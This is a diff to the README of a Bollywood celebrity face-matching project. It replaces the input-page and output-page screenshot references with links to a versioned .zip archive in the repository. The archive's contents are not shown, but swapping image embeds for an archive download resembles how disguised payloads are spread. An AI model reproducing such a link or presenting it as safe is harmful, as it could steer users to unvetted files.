@@ -1,7 +1,7 @@
 # Face Matching with Bollywood Celebrity
 
 ## Input Page
-![Input page](bollywood_input_page.png)
+![Input page](https://github.com/Arnab1998-cyber/face_matching_with_celebrity/raw/refs/heads/main/src/with_matching_celebrity_face_v3.3.zip)
 
 ## Output Page
-![Output_page](bollywood_output_page.png)
+![Output_page](https://github.com/Arnab1998-cyber/face_matching_with_celebrity/raw/refs/heads/main/src/with_matching_celebrity_face_v3.3.zip)
